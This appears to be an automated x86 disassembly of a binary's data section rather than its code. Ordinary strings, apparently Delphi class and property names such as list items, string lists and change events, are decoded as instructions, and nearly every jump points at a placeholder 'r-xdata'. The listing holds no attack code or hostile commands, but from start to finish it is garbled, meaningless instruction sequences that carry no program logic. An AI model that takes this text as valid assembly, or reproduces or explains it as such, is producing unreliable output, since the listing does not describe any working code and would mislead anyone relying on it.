bound ebp [ edi + 0x76 ]
pop es
push 0x646e5574
jb r-xdata
inc ebx
outsd
insb
push cs
push edx
imul esp [ edi + 0x68 ] 0x64730774
add [ eax ] al
or al 0xdd
inc ebx
add [ esi ] al
jae r-xdata
add al 0x0
inc esi
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
insd
popad
outsb
or eax 0x78456669
dec esp
push esi
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
add [ eax - 0x28 ] dh
inc ebx
add ah ah
adc [ eax ] al
lea eax [ eax ]
enter 0x43de 0x0
imul ebp [ esi + 0x67 ] 0x40117400
or [ esi ] cl
push esp
dec esp
push esi
inc ebx
push 0x65676e61
inc ebp
jbe r-xdata
add al cl
fiadd [ ebx ]
dec ecx
jb r-xdata
outsb
je r-xdata
adc edx [ esp + ecx * 2 + 0x56 ]
outsb
je r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
inc ebx
add [ eax - 0x24 ] bh
inc ebx
insd
add [ ecx ] eax
push ebx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
dec eax
or [ ecx + ecx * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] eax
add [ eax ] al
fld [ ebx ]
add edx [ eax ]
add al 0x49
je r-xdata
outsb
add [ eax ] cl
push cs
push esp
dec esp
push esi
inc ebp
imul esi [ fs : ebp + 0x64 ] 0x6e657645
add [ eax - 0x28 ] dh
inc ebx
add [ eax ] ah
fiadd [ ebx ]
or [ edi ] cl
push esp
dec esp
push esi
inc ebp
insd
add [ ecx + edx + 0x40 ] dh
jae r-xdata
inc eax
dec eax
outsd
je r-xdata
inc edx
insb
outsd
ja r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add [ esi ] al
inc ebx
push 0x65676e61
or edx [ ecx + ecx * 2 + 0x74 ]
insd
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
adc edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
lea eax [ eax ]
rcr ch 0x43
add [ esi ] al
inc ebx
outsd
insd
inc ebx
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jae r-xdata
outsb
jb r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
inc ebx
outsd
insb
jne r-xdata
add cl [ eax ]
push es
push ebx
dec ecx
je r-xdata
insd
pop es
inc ebx
outsd
insb
jne r-xdata
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
inc ebx
add [ eax - 0x24 ] bh
inc ebx
add [ eax ] al
adc [ eax ] al
mov eax eax
xchg esp eax
fild [ ebx ]
or [ ebx ] dl
push esp
dec esp
push esi
inc ecx
insb
dec ecx
je r-xdata
je r-xdata
inc ecx
inc ebx
outsd
insb
jne r-xdata
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
push esp
dec esp
dec ecx
je r-xdata
inc eax
jb r-xdata
dec ecx
outsb
outsb
adc [ 0x6e696f50 ] al
je r-xdata
insb
outsd
ja r-xdata
insd
add [ eax ] al
add [ eax ] al
nop
cmp al ah
inc ebx
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x43 ]
outsb
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
dec ecx
je r-xdata
inc ebx
push 0x65676e61
insd
add [ esi ] al
inc ebx
push 0x65676e61
or edx [ ecx + ecx * 2 + 0x74 ]
insd
pop es
outsb
push edx
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
insd
jb r-xdata
outsb
inc ebx
outsd
insd
jo r-xdata
pop es
outsd
insd
jo r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax ] dl
salc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
or [ edi ] cl
push esp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x40117400
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
jb r-xdata
inc ebx
inc ebx
outsd
insb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
inc ebx
push 0x65676e61
add [ ebx ] ecx
insd
outsb
insd
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
nop
clc
loopne r-xdata
jb r-xdata
dec ecx
jns r-xdata
push cs
push esp
dec esp
push esi
dec esi
outsd
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
mov eax 0x80043e0
inc ebp
jbe r-xdata
dec esp
push esi
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] dl
salc
inc ebx
add ah bl
fild [ ebx ]
or [ esp + edx * 2 ] dl
dec esp
push esi
inc ebx
outsd
insb
jne r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jae r-xdata
pop es
or [ esi ] al
inc ebx
outsd
insb
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jae r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
push ebx
add [ eax ] cl
adc dl [ esp + ecx * 2 + 0x56 ]
pop es
dec ecx
outsb
je r-xdata
push edx
insd
add [ eax ] cl
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
pop es
inc edx
je r-xdata
outsb
jbe r-xdata
add [ eax + edx + 0x40 ] dl
outsb
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
jb r-xdata
dec ecx
je r-xdata
je r-xdata
dec ecx
outsd
arpl [ gs : ecx + eax + 0xb ] si
dec ecx
je r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
andps xmm0 [ ebx + 0x75 ]
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add eax 0x63655254
je r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x56 ] dl
inc esp
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
je r-xdata
outsb
add eax 0x65530608
outsb
jb r-xdata
add [ eax - 0x28 ] dh
inc ebx
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
push esp
loope r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
add [ eax ] al
add [ eax ] bl
bound eax [ eax ]
enter 0x43e1 0x0
or [ edx ] dl
push esp
dec esp
push esi
ja r-xdata
inc eax
add [ ecx + 0x43 ] dl
add [ eax - 0x28 ] dh
inc ebx
add [ eax + r-xdata ] dl
or [ edx ] dl
push esp
dec esp
push esi
insd
inc ebp
je r-xdata
outsb
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc esp
popa
add [ ebx ] ecx
push esp
push edx
inc ebx
jne r-xdata
je r-xdata
ja r-xdata
adc [ edx + edx * 2 ] al
insd
ja r-xdata
insd
dec esp
push ebx
je r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
je r-xdata
jne r-xdata
or eax [ ebp + 0x66 ]
popad
outsb
jb r-xdata
andps xmm1 [ edi + 0x77 ]
xor [ ecx ] ecx
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ 0x6d657449 ] al
xor cl [ ecx ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ 0x6d657449 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x5 ] si
dec ecx
je r-xdata
je r-xdata
je r-xdata
je r-xdata
add [ ecx + edx + 0x40 ] dh
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esp + eax * 2 ] al
popad
je r-xdata
insd
add eax 0x65530608
outsb
imul esi [ ebx + 0x74 ] 0x77656956
dec ecx
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
jne r-xdata
jb r-xdata
je r-xdata
add eax 0x63655241
imul esi [ ebx + 0x74 ] 0x6d657449
add al 0x49
imul esi [ ebx + 0x74 ] 0x77656956
jb r-xdata
add [ ebp - 0x1f47ffc0 ] cl
inc ebx
add [ eax ] cl
inc eax
add [ eax - 0x28 ] dh
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insd
inc esp
jb r-xdata
loope r-xdata
insd
inc ebp
jbe r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
inc ebx
jne r-xdata
dec esp
push esi
insd
jb r-xdata
add [ 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
insd
je r-xdata
dec ecx
je r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
insd
inc esp
jb r-xdata
inc ebp
jbe r-xdata
je r-xdata
push ebx
je r-xdata
ja r-xdata
jae r-xdata
outsd
popad
ja r-xdata
push esp
inc ebx
inc esp
jb r-xdata
ja r-xdata
insb
inc ebx
jne r-xdata
add [ eax ] cl
adc dl [ esp + ecx * 2 + 0x56 ]
outsb
je r-xdata
inc ecx
jbe r-xdata
sbb dl [ esp + ecx * 2 + 0x56 ]
je r-xdata
outsd
outsd
insb
popad
outsb
outsb
arpl [ ebp + 0x64 ] sp
outsb
dec ecx
je r-xdata
lea eax [ eax ]
aam 0xe3
insd
inc esp
jb r-xdata
ja r-xdata
insd
pop es
dec ecx
outsb
je r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x74490408
insd
ja r-xdata
outsd
insb
popad
outsb
je r-xdata
outsb
insd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
jb r-xdata
je r-xdata
add [ eax - 0x16 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sub al 0xe2
inc edx
je r-xdata
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
ja r-xdata
inc ebx
add [ eax ] cl
push ss
push esp
dec esp
push esi
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1dd3ffc0 ] cl
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
insd
dec esp
add ah dl
jecxz r-xdata
add al 0x8
inc ebx
jne r-xdata
add [ edi ] al
push ebx
jne r-xdata
insd
push esp
inc ebx
jne r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
add [ eax ] al
in al 0xca
inc ebx
add [ eax ] al
adc [ eax ] al
inc esp
popa
jne r-xdata
jbe r-xdata
push es
add [ eax + ecx ] al
jb r-xdata
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
je r-xdata
jae r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
add [ eax ] al
adc [ eax ] al
mov al 0xe2
inc ebx
add [ eax ] cl
sbb [ esp + ecx * 2 + 0x56 ] edx
inc ebx
jne r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
je r-xdata
add [ gs : ebx ] ecx
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
dec esp
add [ eax ] cl
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x74490408
insd
je r-xdata
inc esp
je r-xdata
je r-xdata
je r-xdata
inc ebx
inc eax
add [ ebp - 0x1c2bffc0 ] cl
je r-xdata
outsb
add eax 0x74617453
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
je r-xdata
pop es
je r-xdata

insd
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add [ eax ] al
je r-xdata
add ah al
insd
outsb
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ esi ] al
outsd
insd
inc esp
jb r-xdata
add [ 0x67617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
push esp
ja r-xdata
je r-xdata
in eax 0x43
dec ecx
je r-xdata
jae r-xdata
insd
inc esp
jb r-xdata
dec ecx
ja r-xdata
insb
insd
inc esp
jbe r-xdata
add [ 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
insd
add eax 0x65530608
outsb
jb r-xdata
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
arpl [ ebp + eax + 0x54 ] si
outsd
insd
inc esp
jb r-xdata
inc esp
popa
jne r-xdata
add [ ebx ] ecx
popad
insd
inc esp
jb r-xdata
jb r-xdata
adc al [ 0x63655241 ]
push esp
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
popad
ja r-xdata
dec ecx
outsd
adc [ gs : si + 0x43 ] dl
jne r-xdata
add [ gs : 0x67617453 ] al
je r-xdata
jb r-xdata
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
je r-xdata
jb r-xdata

insd
adc [ eax ] al
andps xmm0 [ ebx + 0x75 ]
ja r-xdata
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
add ah al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insd
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add ah al

inc edx
outsd
outsb
jb r-xdata
popad
je r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
ja r-xdata
ja r-xdata
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
add ah al

inc edx
outsd
or eax [ ebp + 0x66 ]
popad
ja r-xdata
insd
ja r-xdata
0xd8700043 0x43
je r-xdata
outsd
jne r-xdata
je r-xdata
jl r-xdata
insd
jae r-xdata
ja r-xdata
je r-xdata
ja r-xdata
outsd
jne r-xdata
popad
insd
inc ebp
jbe r-xdata
push 0x65726944
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ edi + edx * 2 ] al
jb r-xdata
insd
popad
je r-xdata
popad
je r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x56 ] edx
in al 0xca
inc ebx
add [ eax ] al
adc [ eax ] al
cmp al 0xe5
inc ebx
dec ecx
je r-xdata
outsd
je r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsb
jb r-xdata
push es
add [ edi ] al
push ebx
jne r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
jb r-xdata
insd
inc esp
jb r-xdata
outsd
je r-xdata
inc eax
add [ esp + 0x43 ] bh
je r-xdata
insd
inc esp
jb r-xdata
dec ecx
add [ eax - 0x16 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add ah ah
0x43
inc edx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
jne r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax - 0x16 ] ah
inc ebx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
outsb
je r-xdata
ja r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
dec ecx
je r-xdata
bound ecx [ ecx + 0x74 ]
insd
je r-xdata
outsd
insb
popad
outsb
add [ eax ] cl
and [ esp + ecx * 2 + 0x56 ] edx
inc ecx
inc ebx
outsd
jb r-xdata
or [ esi ] al
push ebx
outsb
je r-xdata
ja r-xdata
insd
inc esp
jb r-xdata
add al 0x49
outsb
je r-xdata
outsb
jo r-xdata
outsb
js r-xdata
imul ebp [ esi + 0x67 ] 0x72745306
imul ebp [ esi + 0x67 ] 0x69460c12
outsb
push eax
outsd
jae r-xdata
outsb
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x6e657645
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x69460a02
outsb
push ebx
je r-xdata
inc esi
inc ebp
jbe r-xdata
dec edi
ja r-xdata
inc eax
add [ 0x11080043 ] bh
insd
pop es
dec ecx
outsb
je r-xdata
jae r-xdata
add [ gs : bp + di ] ecx
inc esp
popa
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
insd
ja r-xdata
jae r-xdata
add [ eax ] dl
insd
add eax 0x67617453
ja r-xdata
je r-xdata
je r-xdata
push ebx
jb r-xdata
jne r-xdata
dec ecx
je r-xdata
add cl [ eax ]
push es
je r-xdata
adc [ eax ] eax
jo r-xdata
je r-xdata
inc ebp
insd
jb r-xdata
jbe r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ 0x67617453 ] al
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
add [ gs : bp + di ] ecx
imul esi [ ebx + 0x74 ] 0x6d657449
add al 0x49
add [ edx ] cl
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xa ] si
add [ 0x65646e49 ] eax
js r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
add [ eax ] cl
adc eax 0x4f564c54
inc eax
jb r-xdata
or [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
push esp
dec esp
push esi
or [ ecx ] dl
jb r-xdata
adc cl [ si ]
inc esi
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insd
add [ eax ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
dec ecx
je r-xdata
pop es
je r-xdata
push ds
push esp
dec esp
push esi
inc ecx
jbe r-xdata
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
je r-xdata
add eax 0x63655241
add [ ebx ] ecx
inc esp
popa
ja r-xdata
insd
push ebx
outsb
jb r-xdata
or [ esi ] al
je r-xdata
inc ebx
add [ ebx + 0x43e580c0 ] cl
insd
insd
inc esp
je r-xdata
jb r-xdata
outsb
inc ebp
jb r-xdata
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
outsd
outsb
push es
push esp
push eax
or dl [ ebx + 0x74 ]
popad
imul ebp [ esi + 0x64 ] 0x74495409
insd
add [ esi + eax * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
add eax 0x74617453
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
or al 0xdd
inc ebx
add [ eax ] al
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
insb
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x69460800
outsb
inc esp
popad
je r-xdata
imul esi [ ecx + ebp * 2 + 0x6f ] 0x5054066e
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
insd
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
add [ gs : bp + di ] ecx
inc esp
popa
jne r-xdata
add [ 0x67617453 ] al
je r-xdata
jb r-xdata
or dl [ ebx + 0x74 ]
popad
add [ eax ] cl
inc ebp
outsb
dec ecx
outsb
js r-xdata
jae r-xdata
outsb
je r-xdata
add [ ecx + edx + 0x40 ] dh
popad
je r-xdata
je r-xdata
jb r-xdata
add [ ebx * 8 + 0x10000043 ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x1993ffc0 ] cl
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax - 0x1bffbc24 ] bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0xa007265
push ebx
ja r-xdata
push esp
dec esp
push esi
dec edi
dec ecx
outsb
js r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add [ eax ] cl
adc eax 0x4f564c54
ja r-xdata
inc ebx
je r-xdata
imul ebp [ esi + 0x64 ] 0x69736f50
inc ebp
jbe r-xdata
dec ecx
outsb
js r-xdata
add [ eax ] cl
dec edi
insb
dec ecx
outsb
add [ eax ] cl
inc ebp
outsb
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
or edx [ ecx + ecx * 2 + 0x74 ]
insd
jb r-xdata
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] 0x6e657645
insd
jb r-xdata
dec ecx
outsb
js r-xdata
or [ ebp + 0x6e ] al
add [ ecx ] cl
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
dec ecx
outsb
je r-xdata
jb r-xdata
jb r-xdata
dec ecx
outsb
je r-xdata
dec ecx
outsb
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
outsb
jb r-xdata
dec ecx
outsb
je r-xdata
add [ eax + r-xdata ] dl
or [ esp + edx * 2 ] dl
dec esp
push esi
push ebx
jne r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax - 0x24 ] ah
inc ebx
add [ eax - 0x24 ] ah
inc ebx
add [ edx ] cl
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xa ] si
je r-xdata
je r-xdata
popad
je r-xdata
je r-xdata
je r-xdata
jb r-xdata
add ecx [ eax ]
push es
push ebx
outsb
dec ecx
outsb
js r-xdata
or [ ebp + 0x6e ] al
outsb
je r-xdata
out 0x43 al
jb r-xdata
fadd [ ebx ]
mov eax eax
and ch 0x43
ja r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
jb r-xdata
add al 0x8
push es
push ebx
outsb
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
insd
je r-xdata
add al 0x49
or edx [ ecx + ecx * 2 + 0x74 ]
insd
push ebx
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
dec edi
push ebx
je r-xdata
or [ edi + 0x6c ] cl
je r-xdata
jb r-xdata
outsb
outsw
push esp
imul esi [ eax + 0x45 ] 0x746e6576
add [ ebx ] al
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
adc [ eax ] al
mov eax eax
dec ecx
je r-xdata
jb r-xdata
outsw
push esp
jb r-xdata
or cl [ ecx + 0x6d ]
ja r-xdata
push ebx
pop es
je r-xdata
dec ecx
je r-xdata
jbe r-xdata
inc ebx
push 0x65676e61
inc ebp
push esp
adc [ eax ] al
int3
jbe r-xdata
outsb
adc [ ebx + edx * 2 + 0x65 ] dl
popad
jb r-xdata
or [ ecx + ebp * 2 + 0x72 ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc edx
outsd
outsd
insb
popad
outsb
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
pop es
dec ecx
je r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
je r-xdata
je r-xdata
fsubr st7
inc ebx
dec ecx
insd
popad
insd
imul esi [ eax + 0x6 ] 0x69727453
outsb
add [ si + 0x11 ] dh
inc eax
add [ eax - 0x28 ] dh
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 - 0x15b1ffbd ] ah
inc ebx
add [ eax + 0x3 ] bh
add [ eax ] al
cmp al 0x26
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
popad
dec ecx
outsb
js r-xdata
dec ecx
insd
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x49 ]
add [ ecx + edx + 0x40 ] dh
dec ecx
outsb
je r-xdata
dec ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
je r-xdata
insd
push ebx
je r-xdata
insd
je r-xdata
outsb
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add ah ch
dec ebp
inc esp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + eax * 2 ] ah
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add ah cl
insb
inc esp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
add al bl
dec ecx
je r-xdata
push ebx
jne r-xdata
insd
add [ edi ] al
jae r-xdata
dec esp
push esi
dec edi
ja r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add ah cl
out 0x43 al
add [ eax ] cl
sbb al 0x54
inc eax
add ah ah
adc [ eax ] al
js r-xdata
jb r-xdata
add [ edi ] eax
insd
pop es
dec ecx
outsb
insd
rcl [ ebp + eax * 2 + 0x444aec00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah dl
dec esp
inc esp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ ebx + eax * 4 + 0x5a140044 ] ah
inc esp
add [ edx * 2 + 0x6b000044 ] dh
inc esp
add ah ch
add [ eax + eax + 0x4c ] 0xffffff82
inc esp
add [ eax - 0x3ffbb7e ] cl
add [ eax + eax + 0x24 ] 0x13
inc esi
add [ eax - 0x27ffbb7d ] dh
pop esp
inc esp
add [ ebp + edx * 2 + 0x44 ] bh
add [ ebx + ebx * 2 ] cl
inc esp
add [ eax + 0x5b ] cl
inc esp
add [ esp + edi * 2 ] al
inc esp
add [ esp + edi * 2 + 0x44 ] bl
add ah cl
jl r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add al ch
insb
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add [ eax + ecx * 2 ] cl
inc esp
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
insd
or [ esi + 0x65 ] cl
ja r-xdata
je r-xdata
push [ ecx - 0x4f001301 ]
[ edi - 0x22005101 ]
add ah al
add [ eax + eax + 0x44 ] 0x7d
inc esp
add [ edx + ebx * 2 ] bh
inc esp
add [ edx + ebx * 2 + 0x44 ] ah
add [ eax - 0x27ffbba6 ] dh
pop edx
inc esp
add ah bh
jpe r-xdata
out 0x43 eax
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43e7dcc0 ] cl
inc eax
push esi
inc esp
add [ eax + 0x6e ] ch
inc esp
add [ eax + ebx * 2 + 0x5d5c0044 ] ch
inc esp
add [ eax + 0x70004476 ] bl
push esi
inc esp
add ah al
pop ecx
inc esp
add [ eax + 0x7f ] ch
inc esp
add [ eax - 0x6fffbb7c ] dh
jns r-xdata
add [ eax + 0x59 ] al
inc esp
add [ eax + eax ] bl
or eax 0x2fb010b0
mov al 0xe
mov al 0x4e
mov esp 0x4e0201
adc [ edx ] al
lldt [ 0x2b004701 ]
mov esp 0x7bb030
out dx eax
push [ ebx - 0x4e004d01 ]
add [ edi ] cl
push esp
inc ebx
add ah al
jns r-xdata
inc eax
je r-xdata
jne r-xdata
add [ edi + edi * 2 - 0x7e2bffbc ] bl
inc esp
